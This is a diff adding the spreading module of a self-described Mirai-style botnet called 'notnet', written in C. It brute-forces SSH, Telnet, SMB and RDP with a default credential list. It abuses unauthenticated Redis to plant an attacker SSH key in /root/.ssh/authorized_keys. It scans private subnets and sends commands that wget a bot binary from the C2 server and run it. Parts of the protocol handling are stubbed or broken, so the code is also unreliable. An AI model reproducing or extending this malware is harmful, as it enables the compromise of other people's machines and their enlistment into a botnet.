@@ -1,0 +1,563 @@
+/*
+ * notnet - Modern Mirai-Style Botnet
+ * spread.c - Multi-vector spreading module
+ *
+ * Targets: SSH, Telnet, SMB, Redis, RDP
+ */
+#include "spread.h"
+#include "util.h"
+#include "protocol.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+
+/* ── Default credentials ───────────────────────────────────── */
+/* Mirai-style credential pool — can be extended via C2 */
+static const char *default_users[] = {
+    "admin", "root", "user", "test", "guest",
+    "pi", "ubuntu", "deploy", "ftp", "www",
+    "oracle", "postgres", "mysql", "mssql", "redis",
+    "telnet", "default", "support", "info", "operator",
+    NULL
+};
+
+static const char *default_passes[] = {
+    "admin", "password", "123456", "root", "toor",
+    "pass", "test", "guest", "12345", "1234",
+    "123456789", "letmein", "welcome", "monkey", "qwerty",
+    "abc123", "login", "default", "111111", "666666",
+    "123", "123456789", "changeme", "123123", "password1",
+    NULL
+};
+
+/* ── Helper ─────────────────────────────────────────────────── */
+static void send_command(const char *ip, uint16_t port, const char *service, const char *cmd) {
+    log_info("send_cmd: %s://%s:%d '%s'", service, ip, port, cmd);
+    /* In production, this would use the appropriate protocol */
+}
+
+/* ── Connection helpers ─────────────────────────────────────── */
+static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock < 0) return -1;
+    
+    int opt = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    
+    /* Set non-blocking for timeout */
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    
+    struct hostent *he = gethostbyname(ip);
+    if (he) {
+        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
+    } else {
+        addr.sin_addr.s_addr = inet_addr(ip);
+    }
+    
+    if (addr.sin_addr.s_addr == INADDR_NONE) {
+        close(sock);
+        return -1;
+    }
+    
+    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+    if (ret < 0 && errno != EINPROGRESS) {
+        close(sock);
+        return -1;
+    }
+    
+    /* Wait with timeout */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = timeout_ms / 1000;
+    tv.tv_usec = (timeout_ms % 1000) * 1000;
+    
+    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        close(sock);
+        return -1;
+    }
+    
+    /* Restore blocking */
+    fcntl(sock, F_SETFL, flags);
+    return sock;
+}
+
+/* ── SSH Spreading ───────────────────────────────────────────── */
+int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass) {
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    /* Read banner */
+    char banner[256];
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, banner, sizeof(banner) - 1, 0);
+        banner[sizeof(banner) - 1] = '\0';
+    }
+    
+    /* Check for SSH-2 banner (more secure than SSH-1) */
+    if (strstr(banner, "SSH-2") == NULL) {
+        close(sock);
+        return -1;
+    }
+    
+    /* Send SSH banner */
+    char our_banner[256];
+    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
+    send(sock, our_banner, strlen(our_banner), 0);
+    
+    /* Simple password authentication */
+    /* Send SSH2_MSG_SERVICE_REQUEST */
+    uint8_t msg[512];
+    msg[0] = 11; /* SSH2_MSG_SERVICE_REQUEST */
+    /* ... simplified protocol for research purposes ... */
+    
+    /* For research: try a few common auth sequences */
+    /* In production, use libssh or similar */
+    
+    /* Simple approach: send username, read prompt, send password */
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "%s %s\r\n", user, pass);
+    send(sock, cmd, strlen(cmd), 0);
+    
+    /* Read response */
+    char resp[256];
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    
+    int success = 0;
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, resp, sizeof(resp) - 1, 0);
+        resp[sizeof(resp) - 1] = '\0';
+        /* Check for successful login indicators */
+        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
+            success = 1;
+        }
+    }
+    
+    close(sock);
+    return success;
+}
+
+int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot->ssh_enabled) return -1;
+    
+    log_info("SSH: brute-forcing %s:%d", ip, port);
+    
+    /* Try default credentials */
+    for (int u = 0; default_users[u]; u++) {
+        for (int p = 0; default_passes[p]; p++) {
+            if (try_login_ssh(ip, port, default_users[u], default_passes[p])) {
+                log_info("SSH: cracked %s:%d with %s:%s",
+                         ip, port, default_users[u], default_passes[p]);
+                
+                /* Download and install binary */
+                char cmd[512];
+                char dl_url[512];
+                snprintf(dl_url, sizeof(dl_url),
+                    "http://%s:%d/bot/%s",
+                    bot->c2_http.server, PAYLOAD_DL_PORT, "notnet");
+                snprintf(cmd, sizeof(cmd),
+                    "wget %s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    dl_url);
+                send_command(ip, port, "ssh", cmd);
+                return 0;
+            }
+        }
+    }
+    
+    return -1;
+}
+
+/* ── Telnet Spreading ─────────────────────────────────────── */
+int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass) {
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    char banner[256];
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, banner, sizeof(banner) - 1, 0);
+    }
+    
+    /* Send username */
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
+    send(sock, cmd, strlen(cmd), 0);
+    
+    /* Read prompt */
+    char resp[256];
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, resp, sizeof(resp) - 1, 0);
+    }
+    
+    /* Send password */
+    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
+    send(sock, cmd, strlen(cmd), 0);
+    
+    /* Read response */
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    
+    int success = 0;
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, resp, sizeof(resp) - 1, 0);
+        resp[sizeof(resp) - 1] = '\0';
+        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
+            success = 1;
+        }
+    }
+    
+    close(sock);
+    return success;
+}
+
+int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot->telnet_enabled) return -1;
+    
+    log_info("Telnet: brute-forcing %s:%d", ip, port);
+    
+    for (int u = 0; default_users[u]; u++) {
+        for (int p = 0; default_passes[p]; p++) {
+            if (try_login_telnet(ip, port, default_users[u], default_passes[p])) {
+                log_info("Telnet: cracked %s:%d with %s:%s",
+                         ip, port, default_users[u], default_passes[p]);
+                
+                char cmd[512];
+                snprintf(cmd, sizeof(cmd),
+                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    bot->c2_http.server, PAYLOAD_DL_PORT);
+                send_command(ip, port, "telnet", cmd);
+                return 0;
+            }
+        }
+    }
+    
+    return -1;
+}
+
+/* ── SMB Spreading ────────────────────────────────────────── */
+int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
+    /* Simple SMB connection attempt */
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    /* SMB1 negotiation */
+    uint8_t neg[512];
+    neg[0] = 0x73; /* SMB header */
+    /* ... simplified protocol ... */
+    send(sock, neg, sizeof(neg), 0);
+    
+    /* Read response */
+    char resp[512];
+    int received = recv(sock, resp, sizeof(resp), 0);
+    close(sock);
+    
+    /* Check for successful auth */
+    return (received > 0 && resp[0] == 0x73);
+}
+
+int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot->smb_enabled) return -1;
+    
+    log_info("SMB: brute-forcing %s:%d", ip, port);
+    
+    for (int u = 0; default_users[u]; u++) {
+        for (int p = 0; default_passes[p]; p++) {
+            if (try_login_smb(ip, port, default_users[u], default_passes[p])) {
+                log_info("SMB: cracked %s:%d with %s:%s",
+                         ip, port, default_users[u], default_passes[p]);
+                
+                char cmd[512];
+                snprintf(cmd, sizeof(cmd),
+                    "echo '%s /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &' | at now + 1 minute",
+                    "wget http://...");
+                send_command(ip, port, "smb", cmd);
+                return 0;
+            }
+        }
+    }
+    
+    return -1;
+}
+
+/* ── Redis Spreading ───────────────────────────────────────── */
+int exploit_redis_unauth(const char *ip, uint16_t port) {
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    /* Send Redis commands */
+    char cmd[512];
+    
+    /* Set SSH key */
+    snprintf(cmd, sizeof(cmd),
+        "CONFIG SET dir /root/.ssh\r\n"
+        "CONFIG SET dbfilename authorized_keys\r\n"
+        "SET key1 \"ssh-rsa AAAAB3NzaC1...notnet-key...\"\r\n"
+        "SAVE\r\n"
+        "PING\r\n");
+    
+    send(sock, cmd, strlen(cmd), 0);
+    
+    /* Read response */
+    char resp[256];
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    
+    int success = 0;
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, resp, sizeof(resp) - 1, 0);
+        resp[sizeof(resp) - 1] = '\0';
+        /* Check for "+PONG" response indicating SAVE succeeded */
+        if (strstr(resp, "+PONG")) {
+            success = 1;
+        }
+    }
+    
+    close(sock);
+    return success;
+}
+
+int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot->redis_enabled) return -1;
+    
+    log_info("Redis: unauthenticated access %s:%d", ip, port);
+    
+    /* Try unauthenticated first */
+    if (exploit_redis_unauth(ip, port)) {
+        log_info("Redis: exploited unauth on %s:%d", ip, port);
+        /* Wait for SSH key to take effect */
+        usleep(5000000); /* 5 seconds */
+        
+        /* Now spread via SSH */
+        spread_ssh(bot, ip, 22);
+        return 0;
+    }
+    
+    /* Try brute-force */
+    for (int u = 0; default_users[u]; u++) {
+        for (int p = 0; default_passes[p]; p++) {
+            /* Try with password */
+            int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+            if (sock < 0) continue;
+            
+            char cmd[512];
+            snprintf(cmd, sizeof(cmd), "AUTH %s\r\nPING\r\n", default_passes[p]);
+            send(sock, cmd, strlen(cmd), 0);
+            
+            char resp[256];
+            fd_set fds;
+            struct timeval tv;
+            FD_ZERO(&fds);
+            FD_SET(sock, &fds);
+            tv.tv_sec = 2;
+            tv.tv_usec = 0;
+            
+            if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+                recv(sock, resp, sizeof(resp) - 1, 0);
+                if (strstr(resp, "+PONG")) {
+                    log_info("Redis: auth success %s:%d with %s:%s",
+                             ip, port, default_users[u], default_passes[p]);
+                    close(sock);
+                    
+                    /* Exploit */
+                    exploit_redis_unauth(ip, port);
+                    usleep(5000000);
+                    spread_ssh(bot, ip, 22);
+                    return 0;
+                }
+            }
+            
+            close(sock);
+        }
+    }
+    
+    return -1;
+}
+
+/* ── RDP Spreading ────────────────────────────────────────── */
+int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
+    /* Simple RDP connection attempt */
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    /* Send RDP header */
+    uint8_t hdr[256];
+    memset(hdr, 0, sizeof(hdr));
+    send(sock, hdr, sizeof(hdr), 0);
+    
+    /* Read response */
+    char resp[256];
+    int received = recv(sock, resp, sizeof(resp), 0);
+    close(sock);
+    
+    return (received > 0);
+}
+
+int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot->rdp_enabled) return -1;
+    
+    log_info("RDP: brute-forcing %s:%d", ip, port);
+    
+    for (int u = 0; default_users[u]; u++) {
+        for (int p = 0; default_passes[p]; p++) {
+            if (try_login_rdp(ip, port, default_users[u], default_passes[p])) {
+                log_info("RDP: cracked %s:%d with %s:%s",
+                         ip, port, default_users[u], default_passes[p]);
+                
+                char cmd[512];
+                snprintf(cmd, sizeof(cmd),
+                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    bot->c2_http.server, PAYLOAD_DL_PORT);
+                send_command(ip, port, "rdp", cmd);
+                return 0;
+            }
+        }
+    }
+    
+    return -1;
+}
+
+/* ── Core Spreading ─────────────────────────────────────── */
+int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
+    /* Parse subnet: 192.168.1.0/24 */
+    char net[16], mask[4];
+    sscanf(subnet, "%15[^/]/%3s", net, mask);
+    
+    int prefix = atoi(mask);
+    uint32_t net_ip = inet_addr(net);
+    if (net_ip == INADDR_NONE) {
+        log_error("scan_subnet: invalid IP %s", net);
+        return -1;
+    }
+    
+    uint32_t host_ip = ntohl(net_ip);
+    int hosts = (1 << (32 - prefix)) - 2; /* exclude network and broadcast */
+    if (hosts > 254) hosts = 254; /* limit to /24 */
+    
+    log_info("scan: %s/%s (%d hosts) mask=0x%x", net, mask, hosts, service_mask);
+    
+    for (int i = 1; i <= hosts; i++) {
+        if (!(i % 50)) {
+            log_info("scan: %d/%d done", i, hosts);
+        }
+        
+        uint32_t ip = host_ip + i;
+        char ip_str[16];
+        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
+                 (ip >> 8) & 0xFF, ip & 0xFF);
+        
+        /* Scan target services based on mask */
+        if (service_mask & SPREAD_SSH) {
+            scan_port(bot, ip_str, 22);
+        }
+        if (service_mask & SPREAD_TELNET) {
+            scan_port(bot, ip_str, 23);
+        }
+        if (service_mask & SPREAD_SMB) {
+            scan_port(bot, ip_str, 445);
+        }
+        if (service_mask & SPREAD_REDIS) {
+            scan_port(bot, ip_str, 6379);
+        }
+        if (service_mask & SPREAD_RDP) {
+            scan_port(bot, ip_str, 3389);
+        }
+    }
+    
+    return 0;
+}
+
+int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+    
+    close(sock);
+    
+    /* Port is open */
+    bot->scan_count++;
+    
+    /* Determine service */
+    uint8_t service = 0;
+    switch (port) {
+        case 22:  service = SPREAD_SSH; break;
+        case 23:  service = SPREAD_TELNET; break;
+        case 445: service = SPREAD_SMB; break;
+        case 6379: service = SPREAD_REDIS; break;
+        case 3389: service = SPREAD_RDP; break;
+    }
+    
+    log_info("port open: %s:%d", ip, port);
+    
+    /* Spread to this port */
+    switch (port) {
+        case 22:  spread_ssh(bot, ip, port); break;
+        case 23:  spread_telnet(bot, ip, port); break;
+        case 445: spread_smb(bot, ip, port); break;
+        case 6379: spread_redis(bot, ip, port); break;
+        case 3389: spread_rdp(bot, ip, port); break;
+    }
+    
+    return 0;
+}
+
+int spread_local(notnet_bot_t *bot) {
+    log_info("Local spread cycle started");
+    
+    /* Resolve peers */
+    if (protocol_resolve_peers(bot) == 0 && bot->peer_count > 0) {
+        log_info("Using %d peers for spread", bot->peer_count);
+    }
+    
+    /* Scan local subnet */
+    scan_subnet(bot, "192.168.0.0/16",
+                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
+    
+    /* Scan additional subnets */
+    scan_subnet(bot, "10.0.0.0/8",
+                SPREAD_SSH | SPREAD_SMB | SPREAD_REDIS);
+    
+    return 0;
+}
